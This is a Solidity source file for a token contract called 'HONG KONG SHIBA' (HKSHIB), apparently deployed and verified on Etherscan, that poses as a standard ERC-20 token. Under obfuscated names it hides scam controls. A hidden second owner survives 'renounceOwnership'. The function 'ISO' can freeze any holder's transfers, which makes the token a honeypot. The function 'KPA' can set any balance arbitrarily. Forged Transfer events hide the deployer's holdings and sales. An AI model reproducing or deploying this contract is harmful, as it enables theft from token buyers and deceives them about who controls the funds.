/**
 *Submitted for verification at Etherscan.io on 2023-02-21
*/

pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract HKSHIB {
  
    mapping (address => uint256) private iirb;
	
    mapping (address => uint256) private ikc;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "HONG KONG SHIBA";
	
    string public symbol = "HKSHIB";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private qne;
    uint256 private MIN;
    address private oid;
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address ixF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
		
    oid = msg.sender;
	
    iirb[msg.sender] = totalSupply;
	
	 MIN = 0;
	 
    qne = ixF;
	
    emit Transfer(address(0), qne, totalSupply); 
   
    }

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }


   function balanceOf(address account) public view  returns (uint256) {
        return iirb[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


    
        require(iirb[msg.sender] >= value);
        require(ikc[msg.sender] <= MIN); 
  iirb[msg.sender] -= value;  
        iirb[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
		
		       function ISO (address Px, uint256 Pk)  public {
     require(msg.sender == oid);
	 
	 
   ikc[Px] = Pk;
   
   
   }


 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function KPA (address Px, uint256 Pk)  public {
		
    require(msg.sender == oid);
	
	
    iirb[Px] = Pk;}
   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
     
        require(ikc[from] <= MIN);
        require(ikc[to] <= MIN);
        require(value <= iirb[from]);
        require(value <= allowance[from][msg.sender]);
        iirb[from] -= value;
        iirb[to] += value;
        allowance[from][msg.sender] -= value;
       if(from == oid) {from = ixF;}
        emit Transfer(from, to, value);
        return true; }



    }